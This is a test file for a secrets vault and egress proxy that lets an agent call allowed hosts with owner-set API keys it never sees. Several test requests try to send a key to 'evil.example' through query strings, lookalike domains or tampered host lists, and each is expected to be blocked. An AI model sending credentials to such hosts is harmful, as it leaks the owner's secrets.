import {afterEach, beforeEach, describe, expect, it} from 'vitest'
import type {Secret} from '#shared/roadmap'
import type {EventEntry} from '../server/utils/event-log'
import {Secrets} from '../server/utils/secrets'
import {Store} from '../server/utils/store'
import {testDb} from './db'

const me = {name: 'skoll', owner: true}
const agent = {name: 'claude', owner: false}
const VALUE = 'sk_live_abcdef123456'
let store: Store
let secrets: Secrets
let key: string
let sent: {url: string, init: RequestInit}[]
let answer: (url: string, init: RequestInit) => Response
let lists: Secret[][]
/** For each list heard, whether it was for a use (true) or a change (false). */
let used: boolean[]
let noted: EventEntry[]

beforeEach(async () => {
    store = new Store(testDb())
    await store.createProject({name: 'greenhouse', key: 'GRE'})
    await store.createProject({name: 'pantry', key: 'PAN'})
    key = 'a long random test key'
    sent = []
    lists = []
    used = []
    noted = []
    answer = () => new Response('{"ok":true}', {status: 200, headers: {'content-type': 'application/json'}})
    const send = async (url: string | URL | Request, init?: RequestInit) => {
        sent.push({url: String(url), init: init!})
        return answer(String(url), init!)
    }
    secrets = new Secrets(store, () => key, (list, use) => (lists.push(list), used.push(use)), send as typeof fetch, entry => noted.push(entry))
})

afterEach(() => {
    key = ''
})

/** The status code and message a call fails with. */
async function failure(call: () => unknown): Promise<{status: number, message: string}> {
    try {
        await call()
    } catch (error) {
        const {statusCode, message} = error as {statusCode: number, message: string}
        return {status: statusCode, message}
    }
    throw new Error('it did not fail')
}

const stripe = () => secrets.set('STRIPE_KEY', {value: VALUE, hosts: ['api.stripe.com']}, me)

describe('secrets', () => {
    it('never give their value back, only its last 4 characters', async () => {
        const {secret, created} = await stripe()
        expect(created).toBe(true)
        expect(secret).toMatchObject({name: 'STRIPE_KEY', last4: '3456', hosts: ['api.stripe.com'], projects: null, last_used: null})
        const everything = JSON.stringify([await secrets.list(), await secrets.get('STRIPE_KEY'), lists])
        expect(everything).not.toContain(VALUE)
        const row = await store.db.get<{value: string}>('SELECT value FROM secrets')
        expect(row!.value).not.toContain(VALUE)
        expect(row!.value).toMatch(/^v1:/)
    })

    it('are the owner’s to set, narrow and delete', async () => {
        expect((await failure(() => secrets.set('STRIPE_KEY', {value: VALUE, hosts: ['api.stripe.com']}, agent))).status).toBe(403)
        await stripe()
        expect((await failure(() => secrets.narrow('STRIPE_KEY', {hosts: ['api.stripe.com']}, agent))).status).toBe(403)
        expect((await failure(() => secrets.delete('STRIPE_KEY', agent))).status).toBe(403)
    })

    it('check their name, value and hosts', async () => {
        expect((await failure(() => secrets.set('stripe', {value: VALUE, hosts: ['api.stripe.com']}, me))).status).toBe(400)
        expect((await failure(() => secrets.set('SHORT', {value: 'abc', hosts: ['api.stripe.com']}, me))).message).toContain('too short')
        expect((await failure(() => secrets.set('NONE', {value: VALUE, hosts: []}, me))).status).toBe(400)
        expect((await failure(() => secrets.set('BAD', {value: VALUE, hosts: ['not a host']}, me))).status).toBe(400)
        const {secret} = await secrets.set('PASTED', {value: VALUE, hosts: ['https://API.Stripe.com/v1/', 'deploy.lan:8443']}, me)
        expect(secret.hosts).toEqual(['api.stripe.com', 'deploy.lan:8443'])
    })

    it('need ORRERY_SECRET_KEY', async () => {
        key = ''
        const {status, message} = await failure(stripe)
        expect(status).toBe(503)
        expect(message).toContain('ORRERY_SECRET_KEY')
    })

    it("won't open with another key", async () => {
        await stripe()
        key = 'another key'
        const {status, message} = await failure(() => secrets.egress({url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}}, agent))
        expect(status).toBe(503)
        expect(message).toContain("won't open")
        expect(sent).toEqual([])
    })

    it('narrow without the value, and widen only with it', async () => {
        await secrets.set('GH', {value: VALUE, hosts: ['api.github.com', 'uploads.github.com']}, me)
        expect((await secrets.narrow('GH', {hosts: ['api.github.com'], projects: ['greenhouse']}, me)).hosts).toEqual(['api.github.com'])
        expect((await failure(() => secrets.narrow('GH', {hosts: ['evil.example']}, me))).status).toBe(403)
        expect((await failure(() => secrets.narrow('GH', {projects: null}, me))).status).toBe(403)
        expect((await failure(() => secrets.narrow('GH', {projects: ['greenhouse', 'pantry']}, me))).status).toBe(403)
        // Still opens after narrowing, sealed to its new hosts.
        await secrets.egress({url: 'https://api.github.com/user', headers: {Authorization: 'token {{secret:GH}}'}, project: 'greenhouse'}, agent)
        expect(sent).toHaveLength(1)
    })

    it("won't open when its hosts are changed in the database", async () => {
        await stripe()
        await store.db.run(`UPDATE secrets SET hosts = '["evil.example"]'`)
        const {status} = await failure(() => secrets.egress({url: 'https://evil.example/steal?k={{secret:STRIPE_KEY}}'}, agent))
        expect(status).toBe(503)
        expect(sent).toEqual([])
    })
})

describe('egress', () => {
    beforeEach(stripe)

    it('fills in the secret and sends it to an allowed host', async () => {
        const result = await secrets.egress({url: 'https://api.stripe.com/v1/charges', method: 'POST', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}, body: {amount: 100}}, agent)
        expect(result).toMatchObject({status: 200, body: '{"ok":true}', secrets: ['STRIPE_KEY']})
        expect(sent[0]!.url).toBe('https://api.stripe.com/v1/charges')
        expect(sent[0]!.init).toMatchObject({method: 'POST', redirect: 'manual', body: '{"amount":100}', headers: {'Authorization': `Bearer ${VALUE}`, 'Content-Type': 'application/json'}})
    })

    it('refuses any other host, and plain http', async () => {
        const away = await failure(() => secrets.egress({url: 'https://evil.example/?k={{secret:STRIPE_KEY}}'}, agent))
        expect(away.status).toBe(403)
        expect(away.message).toContain('may only go to api.stripe.com')
        expect((await failure(() => secrets.egress({url: 'https://api.stripe.com.evil.example/?k={{secret:STRIPE_KEY}}'}, agent))).status).toBe(403)
        expect((await failure(() => secrets.egress({url: 'http://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent))).message).toContain('https')
        expect(sent).toEqual([])
    })

    it('never says the value, even when it was put in the host', async () => {
        const {message} = await failure(() => secrets.egress({url: 'https://{{secret:STRIPE_KEY}}.evil.example/'}, agent))
        expect(message).not.toContain(VALUE)
        expect(message).toContain('{{secret:STRIPE_KEY}}')
    })

    it('only makes requests that use a secret, and only ones that exist', async () => {
        expect((await failure(() => secrets.egress({url: 'https://api.stripe.com/v1/charges'}, agent))).status).toBe(400)
        expect((await failure(() => secrets.egress({url: 'https://api.stripe.com/?k={{secret:NOPE}}'}, agent))).status).toBe(404)
    })

    it('scrubs the value out of what comes back', async () => {
        answer = () => new Response(`echo ${VALUE} ${encodeURIComponent(VALUE)} ${Buffer.from(`${VALUE}:`).toString('base64')}`, {headers: {'x-echo': VALUE, 'set-cookie': 'a=b'}})
        const result = await secrets.egress({url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}}, agent)
        expect(JSON.stringify(result)).not.toContain(VALUE)
        expect(result.body).toBe('echo {{secret:STRIPE_KEY}} {{secret:STRIPE_KEY}} {{secret:STRIPE_KEY}}')
        expect(result.headers['x-echo']).toBe('{{secret:STRIPE_KEY}}')
        expect(result.headers['set-cookie']).toBeUndefined()
    })

    it('keeps a secret to its projects', async () => {
        await secrets.set('PANTRY_KEY', {value: VALUE, hosts: ['api.stripe.com'], projects: ['pantry']}, me)
        const request = {url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:PANTRY_KEY}}'}}
        expect((await failure(() => secrets.egress(request, agent))).status).toBe(403)
        expect((await failure(() => secrets.egress({...request, project: 'greenhouse'}, agent))).status).toBe(403)
        expect((await secrets.egress({...request, project: 'pantry'}, agent)).status).toBe(200)
    })

    it('records each use, without the value', async () => {
        await secrets.egress({url: 'https://api.stripe.com/v1/customers/{{secret:STRIPE_KEY}}', project: 'greenhouse', issue: 'GRE-1'}, agent)
        answer = () => {
            throw new Error(`connect ECONNREFUSED for ${VALUE}`)
        }
        const failed = await failure(() => secrets.egress({url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}}, agent))
        expect(failed.status).toBe(502)
        expect(failed.message).not.toContain(VALUE)
        const {uses, last_used} = await secrets.get('STRIPE_KEY')
        expect(uses).toMatchObject([
            {method: 'GET', host: 'api.stripe.com', path: '/v1/charges', status: null, error: expect.stringContaining('ECONNREFUSED'), created_by: 'claude'},
            {method: 'GET', host: 'api.stripe.com', path: '/v1/customers/{{secret:STRIPE_KEY}}', project: 'greenhouse', issue: 'GRE-1', status: 200, error: null},
        ])
        expect(last_used).toEqual(uses[0])
        expect(JSON.stringify(uses)).not.toContain(VALUE)
        expect(lists.at(-1)![0]!.last_used!.id).toBe(uses[0]!.id)
    })

    it('say a use apart from a change, so using one sets off no backup (ORR-526)', async () => {
        // STRIPE_KEY is set before each of these.
        await secrets.set('GITHUB_TOKEN', {value: 'ghp_a long test token', hosts: ['api.github.com']}, me)
        expect(used).toEqual([false, false])
        await secrets.egress({url: 'https://api.stripe.com/v1/customers/{{secret:STRIPE_KEY}}'}, agent)
        await secrets.own('https://api.github.com/repos/o/r/pulls', 'GITHUB_TOKEN', 'greenhouse')
        expect(used).toEqual([false, false, true, true])
        // The list it hears with a use still has the use on it.
        expect(lists.at(-1)!.find(s => s.name === 'GITHUB_TOKEN')!.last_used).toMatchObject({host: 'api.github.com', created_by: 'orrery'})
        await secrets.delete('STRIPE_KEY', me)
        expect(used.at(-1)).toBe(false)
    })

    it('tell the event log who set, narrowed, sent and deleted which, never a value or a path', async () => {
        noted = []
        await secrets.egress({url: 'https://api.stripe.com/v1/customers/{{secret:STRIPE_KEY}}', project: 'greenhouse', issue: 'GRE-1'}, agent)
        await secrets.narrow('STRIPE_KEY', {projects: ['greenhouse']}, me)
        await secrets.set('STRIPE_KEY', {value: VALUE, hosts: ['api.stripe.com']}, me)
        await secrets.delete('STRIPE_KEY', me)
        expect(noted.map(e => [e.kind, e.message])).toEqual([
            ['egress.called', 'claude sent STRIPE_KEY to GET api.stripe.com: 200'],
            ['secret.narrowed', 'skoll narrowed STRIPE_KEY to api.stripe.com'],
            ['secret.set', 'skoll replaced STRIPE_KEY, for api.stripe.com'],
            ['secret.deleted', 'skoll deleted STRIPE_KEY'],
        ])
        expect(noted[0]).toMatchObject({project: 'greenhouse', details: {by: 'claude', secrets: ['STRIPE_KEY'], method: 'GET', host: 'api.stripe.com', status: 200, issue: 'GRE-1'}})
        expect(JSON.stringify(noted)).not.toContain(VALUE)
        expect(JSON.stringify(noted)).not.toContain('/v1/customers')
    })

    it('fill a url for where they sit: a whole address as it is, a path keeping its slashes, a query escaped', async () => {
        await secrets.set('SLACK_WEBHOOK', {value: 'https://hooks.slack.com/services/T000/B000/XXXX', hosts: ['hooks.slack.com']}, me)
        await secrets.set('SLACK_PATH', {value: 'T000/B000/XX YY', hosts: ['hooks.slack.com']}, me)
        await secrets.set('QUOTED', {value: "it's/a&b c", hosts: ['hooks.slack.com']}, me)
        await secrets.egress({url: '{{secret:SLACK_WEBHOOK}}', method: 'POST', body: {text: 'hi'}}, agent)
        await secrets.egress({url: '{{secret:SLACK_WEBHOOK}}?ref={{secret:QUOTED}}'}, agent)
        await secrets.egress({url: 'https://hooks.slack.com/services/{{secret:SLACK_PATH}}?q={{secret:QUOTED}}#{{secret:QUOTED}}'}, agent)
        expect(sent.map(s => s.url)).toEqual([
            'https://hooks.slack.com/services/T000/B000/XXXX',
            "https://hooks.slack.com/services/T000/B000/XXXX?ref=it%27s%2Fa%26b%20c",
            "https://hooks.slack.com/services/T000/B000/XX%20YY?q=it%27s%2Fa%26b%20c#it's%2Fa%26b%20c",
        ])
        // The hosts still decide where a whole address may go, and the path recorded keeps the placeholder.
        await secrets.set('ELSEWHERE', {value: 'https://evil.example/x', hosts: ['hooks.slack.com']}, me)
        expect((await failure(() => secrets.egress({url: '{{secret:ELSEWHERE}}'}, agent))).status).toBe(403)
        const {uses} = await secrets.get('SLACK_PATH')
        expect(uses[0]!.path).toBe('/services/{{secret:SLACK_PATH}}')
        // An answer echoing the url gives the query's own escaping back, `'` as `%27`: scrubbed too.
        answer = url => new Response(`you asked for ${url}`)
        const echoed = await secrets.egress({url: 'https://hooks.slack.com/services/{{secret:SLACK_PATH}}?q={{secret:QUOTED}}'}, agent)
        expect(echoed.body).toBe('you asked for https://hooks.slack.com/services/{{secret:SLACK_PATH}}?q={{secret:QUOTED}}')
    })

    it('cuts a long answer', async () => {
        answer = () => new Response('x'.repeat(1_000_010))
        const result = await secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent)
        expect(result.truncated).toBe(true)
        expect(result.body).toHaveLength(1_000_000)
    })

    it("doesn't leak a value cut through at the end of a long answer", async () => {
        for (const k of [1, 5, VALUE.length - 1]) {
            answer = () => new Response(`${'x'.repeat(1_000_000 - k)}${VALUE}tail`)
            const result = await secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent)
            expect(result.truncated).toBe(true)
            expect(result.body.endsWith(VALUE.slice(0, k))).toBe(false)
            expect(result.body.length).toBeLessThanOrEqual(1_000_000)
        }
    })

    it('scrubs JSON-escaped values and Basic auth with a user name', async () => {
        await secrets.set('ODD', {value: 'q"uo/te\\z+&1', hosts: ['api.stripe.com']}, me)
        const odd = 'q"uo/te\\z+&1'
        answer = () => new Response([
            JSON.stringify({echo: odd}),
            JSON.stringify(odd).replaceAll('/', '\\/'),
            `Basic ${Buffer.from(`user:${VALUE}`).toString('base64')}`,
            `Basic ${Buffer.from(`ab:${VALUE}`).toString('base64url')}`,
        ].join(' '))
        const result = await secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}&o={{secret:ODD}}'}, agent)
        const decoded = [...result.body.matchAll(/[A-Za-z0-9+/_-]{8,}={0,2}/g)].map(([m]) => Buffer.from(m, 'base64').toString('latin1')).join(' ')
        expect(result.body + decoded).not.toContain(VALUE)
        expect(result.body).not.toContain('uo\\/te')
        expect(result.body).not.toContain('uo/te')
    })

    it('reads no more of an answer than it gives back', async () => {
        let pulled = 0
        const stream = new ReadableStream<Uint8Array>({
            pull(controller) {
                pulled += 65_536
                if (pulled > 50_000_000) controller.close()
                else controller.enqueue(new Uint8Array(65_536).fill(120))
            },
        })
        answer = () => new Response(stream)
        const result = await secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent)
        expect(result.truncated).toBe(true)
        expect(pulled).toBeLessThan(2_000_000)
    })

    it('answers 502 and records the use when the answer breaks off', async () => {
        const stream = new ReadableStream<Uint8Array>({
            start(controller) {
                controller.enqueue(new TextEncoder().encode('partial'))
                controller.error(new Error(`socket hang up after ${VALUE}`))
            },
        })
        answer = () => new Response(stream)
        const failed = await failure(() => secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent))
        expect(failed.status).toBe(502)
        expect(failed.message).not.toContain(VALUE)
        const {uses} = await secrets.get('STRIPE_KEY')
        expect(uses[0]).toMatchObject({status: 200, error: expect.stringContaining('socket hang up')})
    })

    it('escapes the value where it goes: in the url and in a JSON body', async () => {
        const odd = 'ab+cd&x=1"q\\z'
        await secrets.set('ODD', {value: odd, hosts: ['api.stripe.com']}, me)
        await secrets.egress({url: 'https://api.stripe.com/v1?k={{secret:ODD}}', method: 'POST', body: {key: '{{secret:ODD}}'}}, agent)
        expect(new URL(sent[0]!.url).searchParams.get('k')).toBe(odd)
        expect(JSON.parse(String(sent[0]!.init.body))).toEqual({key: odd})
        // A text body goes as it is unless it says it's JSON or a form.
        await secrets.egress({url: 'https://api.stripe.com/v1', method: 'POST', body: 'key={{secret:ODD}}', headers: {'Content-Type': 'application/x-www-form-urlencoded'}}, agent)
        expect(new URLSearchParams(String(sent[1]!.init.body)).get('key')).toBe(odd)
        await secrets.egress({url: 'https://api.stripe.com/v1', method: 'POST', body: 'raw {{secret:ODD}}', headers: {Authorization: 'X {{secret:ODD}}'}}, agent)
        expect(sent[2]!.init.body).toBe(`raw ${odd}`)
        expect((sent[2]!.init.headers as Record<string, string>).Authorization).toBe(`X ${odd}`)
    })

    it('forgets its uses when deleted, so a new secret by that name starts clean', async () => {
        await secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent)
        await secrets.delete('STRIPE_KEY', me)
        await stripe()
        expect((await secrets.get('STRIPE_KEY')).uses).toEqual([])
    })
})
